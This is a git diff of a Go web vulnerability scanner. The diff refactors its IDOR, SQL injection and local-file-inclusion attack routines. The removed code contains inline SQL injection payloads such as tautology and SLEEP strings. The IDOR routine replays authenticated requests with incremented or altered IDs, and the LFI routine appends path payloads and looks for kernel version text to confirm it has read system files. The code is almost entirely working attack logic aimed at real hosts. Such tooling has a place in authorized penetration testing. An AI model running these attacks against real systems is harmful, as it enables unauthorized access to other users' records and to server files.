@@ -27,755 +27,372 @@ Sorry python.
 
 import (
 	"bytes"
-	"encoding/base64"
-	"encoding/json"
-	"errors"
 	"flag"
 	"fmt"
 	"io"
-	"net/http"
-	"net/url"
-	"os"
-	"regexp"
-	"strconv"
 	"strings"
 	"time"
 
-	"github.com/golang-jwt/jwt/v5"
+	// Payloads
+	"webreconx/Payloads"
+
+	// Units
+	"webreconx/Unit"
 )
 
-var (
-	File *string
-)
 
-func getobjects(file string) (map[string]any, error) {
+func IdorAttack(data map[string]any) (map[string]any, error) {
 	result := map[string]any{}
 
-	if file == "example.txt" || file == "" || !strings.Contains(strings.ToLower(file), ".txt") {
-		return result, errors.New("Invalid scan value.")
-	}
-
-	zfile, err := os.Stat(file);
-
-	if zfile.IsDir() {
-		return result, errors.New("Invalid input, input is folder.") 
-	}
-
-	if errors.Is(err, os.ErrNotExist) {
-		return result, errors.New("Invalid file not exist.")
-	}
-
-	data, err := os.ReadFile(file)
-
+	requestData, err := unit.VaildRequest(data)
 	if err != nil {
 		return result, err
 	}
 
-	content := string(data)
-	lines := strings.Split(content, "\n")
-	request := strings.Fields(strings.TrimSpace(lines[0]))
+	client := unit.CreateClient()
 
-	if len(request) < 3 {
-		return result, errors.New("Invalid request")
-	}
+	bodyvalues := unit.CheckBody(requestData.Body, payloads.IDORKnownCommonPayloads)
+	pathvalues, err := unit.CheckPath(requestData.Path)
+	queryValues, q := unit.CheckQuery(requestData.Path, payloads.IDORKnownCommonPayloads)
 
-	/**
-
-	// request[0] = HTTP Method
-	// request[1] = Path
-	// request[2] = Protoal
-
-	Method := request[0]
-	Path := request[1]
-	Protoal := request[2]
-
-
-	fmt.Printf("Method: %v\n", Method)
-	fmt.Printf("Path: %v\n", Path)
-	fmt.Printf("Protoal: %v\n", Protoal)
-
-
-	**/
-
-	Headers := map[string]string{}
-	Start := -1
-
-	for i, word := range lines[1:] {
-		if strings.TrimSpace(word) == "" {
-			Start = i + 2 
-			break
-		}
-
-		part := strings.SplitN(word, ":", 2)
-		if len(part) != 2 {
-			continue
-		}
-
-		key := strings.TrimSpace(part[0])
-		value := strings.TrimSpace(part[1])
-
-		Headers[key] = value
-	}
-
-	// fmt.Printf("%v\n", Headers["Accept"])
-
-	BodyDataEncode := map[string]any{}
-	BodyTypeDataEncode := ""
-
-	if Start != -1 && Start < len(lines) {
-		body := strings.TrimSpace(strings.Join(lines[Start:], "\n"))
-
-		if strings.HasPrefix(body, "{") {
-			err := json.Unmarshal([]byte(body), &BodyDataEncode)
-			if err != nil {
-				return result, err
-			}
-
-			BodyTypeDataEncode = "json"
-		} else if strings.HasPrefix(body, "[") {
-			var array []map[string]any
-
-			err := json.Unmarshal([]byte(body), &array)
-			if err != nil {
-				return result, err
-			}
-
-			for _, obj := range array {
-				for key, value := range obj {
-					BodyDataEncode[key] = value
-				}
-			}
-
-			BodyTypeDataEncode = "json"
-		} else {
-			for _, b := range strings.Split(body, "&") {
-				part := strings.SplitN(b, "=", 2)
-				if len(part) != 2 {
-					continue
-				}
-
-				key := strings.TrimSpace(part[0])
-				value := strings.TrimSpace(part[1])
-
-				BodyDataEncode[key] = value
-			}
-
-			BodyTypeDataEncode = "form"
-		}
-	}
-
-	// fmt.Printf("%v\n", BodyDataEncode["wow"])
-
-	result["Method"] = request[0]
-	result["Path"] = request[1]
-	result["Protoal"] = request[2]
-	result["Headers"] = Headers
-	result["Data"] = BodyDataEncode
-	result["DataType"] = BodyTypeDataEncode
-
-	return result, nil
-}
-
-func JwtDecode(token string) (map[string]any, error) {
-	result := map[string]any{}
-	
-	if token == "" {
-		fmt.Print("JWT token not fill.")
-		return result, nil
-	}
-
-	parsedToken, _ := jwt.Parse(token, func(token *jwt.Token) (interface{}, error) {
-        return []byte("a-string-secret-at-least-256-bits-long"), nil
-    })
-
-	if !parsedToken.Valid {
-		result["Header"] = parsedToken.Header
-		result["Data"] = parsedToken.Claims
-		result["Vaild"] = false
-		return result, nil
-	} else {
-		result["Header"] = parsedToken.Header
-		result["Data"] = parsedToken.Claims
-		result["Vaild"] = true
-		return result, nil
-	}
-}
-
-// Would've easier to make function instand always write it again
-
-func createNewRequest(method string, requestURL string, body io.Reader, headers map[string]string,
-	) (*http.Request, error) {
-	req , err := http.NewRequest(method, requestURL, body)
-	if err != nil {
-		return nil, err
-	}
-
-	for key,value := range headers { 
-		req.Header.Add(key,value)
-	}
-
-	return req, nil
-}
-
-
-func checktype(value string) string {
-	_, err := strconv.Atoi(value)
-	if err == nil {
-		return "number"
-	}
-
-	// Check if string is base64
-	// https://stackoverflow.com/questions/15334220/encode-decode-base64
-	d, err := base64.StdEncoding.DecodeString(value)
-	if err == nil && base64.StdEncoding.EncodeToString(d) == value {
-		return "base64"
-	}
-
-
-	// For all who wonder how would you check the string if he UUID 
-	// https://stackoverflow.com/questions/25051675/how-to-validate-uuid-v4-in-go
-
-	r := regexp.MustCompile("^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$")
-    if r.MatchString(value) {
-		return "uuid"
-	}
-
-	return "string"
-}
-
-func checktypedata(data map[string]any, datatype string) (io.Reader, error) {
-	switch datatype {
-	case "json":
-		jsdata, err := json.Marshal(data)
-		if err != nil { 
-			return nil, err
-		}
-
-		return bytes.NewReader(jsdata), nil
-	case "form":
-		form := url.Values{}
-
-		for key,value := range data {
-			form.Set(key, fmt.Sprint(value))
-		}
-
-		return strings.NewReader(form.Encode()), nil
-	}
-
-	return nil, errors.New("Invalid Data Type")
-}
-
-func createAttackID(value string) string {
-	idtype := checktype(value)
-
-	switch idtype {
-	case "number":
-		id, err := strconv.Atoi(value)
-		if err != nil {
-			return ""
-		}
-
-		println("number")
-
-		return strconv.Itoa(id + 1)
-	case "uuid":
-		id := []byte(value)
-
-		for i := len(id) -1; i >= 0; i-- {
-			if id[i] == '-' {
-				continue
-			}
-
-			if id[i] != 'f' {
-				id[i] = 'f'
-			} else {
-				id[i] = 'e'
-			}
-
-			break
-		}
-
-		return string(id)
-	case "base64":
-		d, err := base64.StdEncoding.DecodeString(value)
-		if err != nil {
-			return ""
-		}
-
-		decodevalue := string(d)
-
-		id , err := strconv.Atoi(decodevalue)
-		if err != nil {
-			return ""
-		}
-
-		modifie := strconv.Itoa(id + 1)
-
-		return base64.StdEncoding.EncodeToString([]byte(modifie))
-	case "string":
-		re := regexp.MustCompile(`^(.*?)(\d+)$`)
-		match := re.FindStringSubmatch(value)
-
-		if len(match) == 3 {
-			id, err := strconv.Atoi(match[2])
-			if err == nil {
-				return match[1] + strconv.Itoa(id+1)
-			}
-		}
-
-
-		return value + "1"
-	}
-
-	return ""
-}
-
-// IDOR attack only basic.
-// Its support : base64, UUID v4, number, string
-// Target only: Path, Url Form, Body Form/Json
-
-// Target Payload current: "id","user_id","ID","user_ID","uuid","document","user"
-
-func IdorAttack(data map[string]any) (map[string]any, error) {
-	result := map[string]any{}
-	result["Found"] = false
-	KnownCommon := []string{"id","user_id","ID","user_ID","uuid","document","user"}
-
-	if len(data) == 0 {
-		return result, errors.New("Invalid data")
-	}
-
-	Headers, ok := data["Headers"].(map[string]string)
-	if !ok {
-		return result, errors.New("Invalid Headers")
-	}
-
-	if Headers["Authorization"] == "" && Headers["Cookie"] == "" {
-		return result, errors.New("Invalid Auth, User is not Auth")
-	}
-
-	tr := &http.Transport{
-		MaxIdleConns:       10,
-		IdleConnTimeout:    30 * time.Second,
-		DisableCompression: true,
-	}
-
-	client := &http.Client{
-		Transport: tr,
-	}
-
-	Method := data["Method"].(string)
-	if Method == "" {
-		return result, errors.New("Invalid Method")
-	}
-
-	body, ok := data["Data"].(map[string]any)
-	if !ok {
-		return result, errors.New("Invalid body")
-	}
-
-	DataType := data["DataType"].(string)
-	
 	// IDOR based data body
 
-	for _, key := range KnownCommon {
-		value, exist := body[key]
-		if !exist {
-			continue
-		}
-
+	for key, value := range bodyvalues {
 		MainID := fmt.Sprint(value)
 
-		AttackID := createAttackID(MainID)
-
-		if len(AttackID) == 0 {
+		AttackID := unit.CreateAttackID(MainID)
+		if AttackID == "" {
 			continue
 		}
 
-		body[key] = AttackID
-
-		BodyEncode, err := checktypedata(body, DataType)
+		err := unit.ReplaceBody(requestData.Body, key, AttackID)
 		if err != nil {
 			continue
 		}
 
-		requestURL := fmt.Sprintf("http://%v", Headers["Host"]) // for testing
-		//requestURL := fmt.Sprintf("https://%v", Headers["Host"]) // real target
-		req , err := createNewRequest(Method, requestURL, BodyEncode, Headers)
+		BodyEncode, err := unit.Checktypedata(requestData.Body, requestData.DataType)
+		if err != nil {
+			unit.ReplaceBody(requestData.Body, key, value)
+			continue
+		}
+
+		requestURL := unit.BuildUrl(requestData.Headers["Host"], "" , false)
+		_, status, _, err := unit.SendRequest(client, requestData.Method, requestURL, BodyEncode, requestData.Headers)
 
 		if err != nil {
+			unit.ReplaceBody(requestData.Body, key, value)
 			return result, err
 		}
 
-		fmt.Printf("Main ID - %v\n", MainID)
-		fmt.Printf("Attack ID - %v\n", AttackID)
+		unit.ReplaceBody(requestData.Body, key, value)
 
-		res, err := client.Do(req)
-
-		if err != nil {
-			return result, err
-		}
-
-		body[key] = MainID
-
-		if res.StatusCode >= 200 {
-			result["Found"] = true
+		if unit.IsSucces(status) {
 			result["Payload"] = key
 			result["MainID"] = MainID
 			result["AttackID"] = AttackID
-			result["Status"] = res.StatusCode
+			result["Status"] = status
+
+			return result, nil
 		}
 	}
 
 	// IDOR based path
 
-	Path, ok := data["Path"].(string)
-	if !ok {
-		return result, errors.New("Invalid Path")
-	}
+	for i, part := range pathvalues {		
+		if unit.Checktype(part) == "string" {
+			continue
+		}
 
-	if Path != "" && result["Found"].(bool) {
-		parts := strings.Split(Path, "/")
+		AttackID := unit.CreateAttackID(part)
+		if AttackID == "" {
+			continue
+		}
 
-		for i, part := range parts {
-			if part == "" { continue }
+		AttackPath, err := unit.ReplacePath(requestData.Path, i, AttackID)
+		if err != nil {
+			continue
+		}
 
-			idtype := checktype(part)
-			
-			if idtype == "string" {
-				continue
-			}
+		requestURL := unit.BuildUrl(requestData.Headers["Host"], AttackPath, false)
+		_, status, _, err := unit.SendRequest(client, requestData.Method, requestURL, nil, requestData.Headers)
 
-			AttackID := createAttackID(part)
+		if err != nil {
+			unit.ReplacePath(requestData.Path, i, part)
+			return result, err
+		}
 
-			if len(AttackID) == 0 {
-				continue
-			}
+		unit.ReplacePath(requestData.Path, i, part)
 
-			attackpart := make([]string, len(parts))
-			copy(attackpart, parts)
+		if unit.IsSucces(status) {
+			result["Payload"] = AttackPath
+			result["MainID"] = part
+			result["AttackID"] = AttackID
+			result["Status"] = status
 
-			mainpath := strings.Join(attackpart, "/")
-
-			attackpart[i] = AttackID
-
-			attackpath := strings.Join(attackpart, "/")
-
-			fmt.Printf("Main Path - %v\n", mainpath)
-			fmt.Printf("Attack Path - %v\n", attackpath)
-
-			requestURL := fmt.Sprintf("http://%v%s", Headers["Host"], attackpath) // for testing
-			//requestURL := fmt.Sprintf("https://%v/%v", Headers["Host"], attackpath) // real target
-			req , err := createNewRequest(Method, requestURL, nil, Headers)
-
-			if err != nil {
-				return result, err
-			}
-
-			res, err := client.Do(req)
-
-			if err != nil {
-				return result, err
-			}
-
-			if res.StatusCode >= 200 {
-				result["Found"] = true
-				result["Payload"] = attackpath
-				result["MainID"] = part
-				result["AttackID"] = AttackID
-				result["Status"] = res.StatusCode
-			}
+			return result, nil
 		}
 	}
 
 	// IDOR based Url form
-	q, err := url.Parse(Path)
-	if err != nil {
-		return result, err
-	}
 
-	query := q.Query()
-
-	for _, key := range KnownCommon {
-		values, exist := query[key]
-		if !exist {
-			continue
-		}
-
+	for key, values := range queryValues {
 		for i, value := range values {
-			MainID := fmt.Sprint(value)
 
-			AttackID := createAttackID(MainID)
+			MainID := value
+			AttackID := unit.CreateAttackID(MainID)
 
 			if len(AttackID) == 0 {
 				continue
 			}
 
-			query[key][i] = AttackID
+			attackquery, err := unit.ReplaceQuery(q, key, AttackID, i)
+			if err != nil {
+				continue
+			}
 
-			q.RawQuery = query.Encode()
-
-			requestURL := fmt.Sprintf("http://%v%s", Headers["Host"], q.RequestURI()) // for testing
-			//requestURL := fmt.Sprintf("https://%v%s", Headers["Host"]) // real target
-			req , err := createNewRequest(Method, requestURL, nil, Headers)
+			requestURL := unit.BuildUrl(requestData.Headers["Host"], attackquery, false)
+			_, status, _, err := unit.SendRequest(client, requestData.Method, requestURL, nil, requestData.Headers)
 
 			if err != nil {
+				unit.ReplaceQuery(q, key, MainID, i)
 				return result, err
 			}
 
-			fmt.Printf("Main ID - %v\n", MainID)
-			fmt.Printf("Attack ID - %v\n", AttackID)
-
-			res, err := client.Do(req)
-
-			if err != nil {
-				return result, err
-			}
-
-			query[key][i] = MainID
-
-			q.RawQuery = query.Encode()
-
-			if res.StatusCode >= 200 {
-				result["Found"] = true
+			if unit.IsSucces(status) {
 				result["Payload"] = key
 				result["MainID"] = MainID
 				result["AttackID"] = AttackID
-				result["Status"] = res.StatusCode
+				result["Status"] = status
+
+				return result, nil
 			}
 		}
 	}
-
-
-
+	
 	return result, nil
 }
 
-// Sqli attack only basic.
-// Its support : base64, UUID v4, number, string
-// Target only: Url Form, Body Form/Json
-
-// Target Payload current: "id","user_id","ID","user_ID","uuid","document","user"
-// Target Payload SQL cuurent: time based, boolean based, blind based
-
 func sqliAttack(data map[string]any) (map[string]any, error) {
 	result := map[string]any{}
-	result["Found"] = false
-	KnownCommon := []string{"id","user_id","ID","user_ID","uuid","document","user"}
-	SqliPayloads := []string{"' OR '1'='1'--","' AND '1'='1'--","' AND '1'='2'--", "' SLEEP(5)--"}
 
-
-	if len(data) == 0 {
-		return result, errors.New("Invalid data")
+	requestData, err := unit.VaildRequest(data)
+	if err != nil {
+		return result, err
 	}
 
-	Headers, ok := data["Headers"].(map[string]string)
-	if !ok {
-		return result, errors.New("Invalid Headers")
-	}
+	client := unit.CreateClient()
 
-	if Headers["Authorization"] == "" && Headers["Cookie"] == "" {
-		return result, errors.New("Invalid Auth, User is not Auth")
-	}
+	bodyvalues := unit.CheckBody(requestData.Body, payloads.SqliKnownCommonPayloads)
+	queryValues, q := unit.CheckQuery(requestData.Path, payloads.SqliKnownCommonPayloads)
 
-	tr := &http.Transport{
-		MaxIdleConns:       10,
-		IdleConnTimeout:    30 * time.Second,
-		DisableCompression: true,
-	}
-
-	client := &http.Client{
-		Transport: tr,
-	}
-
-	Method := data["Method"].(string)
-	if Method == "" {
-		return result, errors.New("Invalid Method")
-	}
-
-	body, ok := data["Data"].(map[string]any)
-	if !ok {
-		return result, errors.New("Invalid body")
-	}
-
-	DataType := data["DataType"].(string)
-	
-	// Sqli based data body
-
-	for _, payload := range SqliPayloads {
-		for _, key := range KnownCommon {
-			value, exist := body[key]
-			if !exist {
-				continue
-			}
-
+	for payloadtype, payload := range payloads.SqliPayloads {
+		// Sqli based data body
+		for key, value := range bodyvalues {
 			MainID := fmt.Sprint(value)
 
-			AttackID := fmt.Sprintf("%s%s", MainID, payload)
+			AttackID := MainID + payload
 
-			body[key] = AttackID
-
-			BodyEncode, err := checktypedata(body, DataType)
+			err := unit.ReplaceBody(requestData.Body, key, AttackID)
 			if err != nil {
 				continue
 			}
 
-			requestURL := fmt.Sprintf("http://%v", Headers["Host"]) // for testing
-			//requestURL := fmt.Sprintf("https://%v", Headers["Host"]) // real target
-			req , err := createNewRequest(Method, requestURL, BodyEncode, Headers)
+			BodyEncode, err := unit.Checktypedata(requestData.Body, requestData.DataType)
+			if err != nil {
+				unit.ReplaceBody(requestData.Body, key, value)
+				continue
+			}
+
+			requestURL := unit.BuildUrl(requestData.Headers["Host"], "" , false)
+			_, status, elasped, err := unit.SendRequest(client, requestData.Method, requestURL, BodyEncode, requestData.Headers)
+
+			if err != nil {
+				unit.ReplaceBody(requestData.Body, key, value)
+				return result, err
+			}
+
+			if payloadtype == "Time_Based" {
+				unit.ReplaceBody(requestData.Body, key, value)
+				
+				if elasped >= 5 * time.Second {
+					result["Payload"] = key
+					result["MainID"] = MainID
+					result["AttackID"] = AttackID
+					result["Status"] = status
+					
+					return result, nil
+				}
+			} else {
+				unit.ReplaceBody(requestData.Body, key, value)
+
+				if status >= 500 && status< 600 {
+					result["Found"] = true
+					result["Payload"] = key
+					result["MainID"] = MainID
+					result["AttackID"] = AttackID
+					result["Status"] = status
+					
+					return result, nil
+				}
+			}
+		}
+
+		// Sqli based query
+
+		for key, values := range queryValues {
+			for i, value := range values {
+				MainID := fmt.Sprint(value)
+				AttackID := MainID + payload
+
+				attackquery, err := unit.ReplaceQuery(q, key, AttackID, i)
+				if err != nil {
+					continue
+				}
+
+				requestURL := unit.BuildUrl(requestData.Headers["Host"], attackquery, false)
+				_, status, elasped, err := unit.SendRequest(client, requestData.Method, requestURL, nil, requestData.Headers)
+
+				if err != nil {
+					unit.ReplaceQuery(q, key, MainID, i)
+					return result, err
+				}
+
+
+				if payloadtype == "Time_Based" {
+					unit.ReplaceQuery(q, key, MainID, i)
+
+					if elasped >= 5 * time.Second  {
+						result["Payload"] = key
+						result["MainID"] = MainID
+						result["AttackID"] = AttackID
+						result["Status"] = status
+
+						return result, nil
+					}
+				} else {
+					unit.ReplaceQuery(q, key, MainID, i)
+
+					if status >= 500 && status < 600 {
+						result["Payload"] = key
+						result["MainID"] = MainID
+						result["AttackID"] = AttackID
+						result["Status"] = status
+						
+						return result, nil
+					}
+				}
+			}
+		}
+	}
+
+	return result, nil
+}
+
+func lfiAttack(data map[string]any) (map[string]any, error) {
+	result := map[string]any{}
+
+	requestData, err := unit.VaildRequest(data)
+	if err != nil {
+		return result, err
+	}
+
+	client := unit.CreateClient()
+	bodyvalues := unit.CheckBody(requestData.Body, payloads.LFIKnownCommonPayloads)
+	queryValues, q := unit.CheckQuery(requestData.Path, payloads.LFIKnownCommonPayloads)
+	
+	// LFI based data body
+
+	for _, payload := range payloads.LFIPayloads {
+		for key, value := range bodyvalues {
+			MainID := fmt.Sprint(value)
+			AttackID := strings.TrimRight(MainID, "/") + "/" + strings.TrimLeft(payload, "/")
+
+			err := unit.ReplaceBody(requestData.Body, key, AttackID)
+			if err != nil {
+				continue
+			}
+
+			BodyEncode, err := unit.Checktypedata(requestData.Body, requestData.DataType)
+			if err != nil {
+				unit.ReplaceBody(requestData.Body, key, value)
+				continue
+			}
+
+			requestURL := unit.BuildUrl(requestData.Headers["Host"], "" , false)
+			res, status, _, err := unit.SendRequest(client, requestData.Method, requestURL, BodyEncode, requestData.Headers)
 
 			if err != nil {
 				return result, err
 			}
 
-			fmt.Printf("Main ID - %v\n", MainID)
-			fmt.Printf("Attack Payload - %v\n", AttackID)
+			resbody, err := io.ReadAll(res.Body)
+			if err != nil {
+				unit.ReplaceBody(requestData.Body, key, value)
+				return result, err
+			}
 
-			if payload == "' SLEEP(5)--" {
-				start := time.Now()
-
-				res, err := client.Do(req)
-				if err != nil {
-					return result, err
-				}
-
-				body[key] = MainID
-
-				elapsed := time.Since(start)
+			unit.ReplaceBody(requestData.Body, key, value)
+			
+			if bytes.Contains(resbody, []byte("Linux version")) {
+				result["Payload"] = key
+				result["MainID"] = MainID
+				result["AttackID"] = AttackID
+				result["Status"] = status
 				
-
-				if elapsed >= 5 * time.Second {
-					result["Found"] = true
-					result["Payload"] = key
-					result["MainID"] = MainID
-					result["AttackID"] = AttackID
-					result["Status"] = res.StatusCode
-					break
-				}
-			} else {
-				res, err := client.Do(req)
-				if err != nil {
-					return result, err
-				}
-
-				body[key] = MainID
-
-				if res.StatusCode >= 500 && res.StatusCode < 600 {
-					result["Found"] = true
-					result["Payload"] = key
-					result["MainID"] = MainID
-					result["AttackID"] = AttackID
-					result["Status"] = res.StatusCode
-					break
-				}
+				return result, nil
 			}
 		}
 
-		
-
-		Path, ok := data["Path"].(string)
-		if !ok {
-			return result, errors.New("Invalid Path")
-		}
-
-		// Sqli based Url form
-		q, err := url.Parse(Path)
-		if err != nil {
-			return result, err
-		}
-
-		query := q.Query()
-
-		for _, key := range KnownCommon {
-			values, exist := query[key]
-			if !exist {
-				continue
-			}
-
+		for key, values := range queryValues {
 			for i, value := range values {
 				MainID := fmt.Sprint(value)
+				AttackID := strings.TrimRight(MainID, "/") + "/" + strings.TrimLeft(payload, "/")
 
-				AttackID := fmt.Sprintf("%s%s", MainID, payload)
+				attackquery, err := unit.ReplaceQuery(q, key, AttackID, i)
+				if err != nil {
+					continue
+				}
 
-				query[key][i] = AttackID
-
-				q.RawQuery = query.Encode()
-
-				requestURL := fmt.Sprintf("http://%v%s", Headers["Host"], q.RequestURI()) // for testing
-				//requestURL := fmt.Sprintf("https://%v%s", Headers["Host"]) // real target
-				req , err := createNewRequest(Method, requestURL, nil, Headers)
+				requestURL := unit.BuildUrl(requestData.Headers["Host"], attackquery, false)
+				res, status, _, err := unit.SendRequest(client, requestData.Method, requestURL, nil, requestData.Headers)
 
 				if err != nil {
+					unit.ReplaceQuery(q, key, MainID, i)
 					return result, err
 				}
 
-				fmt.Printf("Main ID - %v\n", MainID)
-				fmt.Printf("Attack Payload - %v\n", AttackID)
+				resbody, err := io.ReadAll(res.Body)
+				if err != nil {
+					unit.ReplaceQuery(q, key, MainID, i)
+					return result, err
+				}
 
-				if payload == "' SLEEP(5)--" {
-					res, err := client.Do(req)
-
-					if err != nil {
-						return result, err
-					}
-
-					query[key][i] = MainID
-
-					q.RawQuery = query.Encode()
-
-					if res.StatusCode >= 500 && res.StatusCode < 600 {
-						result["Found"] = true
-						result["Payload"] = key
-						result["MainID"] = MainID
-						result["AttackID"] = AttackID
-						result["Status"] = res.StatusCode
-						break
-					}
-				} else {
-					start := time.Now()
-
-					res, err := client.Do(req)
-
-					if err != nil {
-						return result, err
-					}
-
-					query[key][i] = MainID
-
-					q.RawQuery = query.Encode()
-
-					elapsed := time.Since(start)
-
-					if elapsed >= 5 * time.Second  {
-						result["Found"] = true
-						result["Payload"] = key
-						result["MainID"] = MainID
-						result["AttackID"] = AttackID
-						result["Status"] = res.StatusCode
-						break
-					}
+				if bytes.Contains(resbody, []byte("Linux version")) {
+					result["Found"] = true
+					result["Payload"] = key
+					result["MainID"] = MainID
+					result["AttackID"] = AttackID
+					result["Status"] = status
+					return result, nil
 				}
 			}
 		}
 	}
 
-
-
 	return result, nil
 }
 
-
 func init() {
-	File = flag.String("scan", "example.txt", "scan request you want and analaying if possible for bug.")
+	unit.File = flag.String("scan", "example.txt", "scan request you want and analaying if possible for bug.")
 }
 
 func main() {
 	flag.Parse()
 
-	data, err := getobjects(*File)
+	data, err := unit.ParseDataFromFile(*unit.File)
 
 	if err != nil {
-		fmt.Printf("Error happen in [getobject], msg: %s", err)
+		fmt.Printf("Error happen in [ParseDataFromFile], msg: %s", err)
 		return
 	}
 
@@ -811,8 +428,5 @@ func main() {
 
 	fmt.Println(da["wow"])
 	**/
-
-	
-
 
 }	
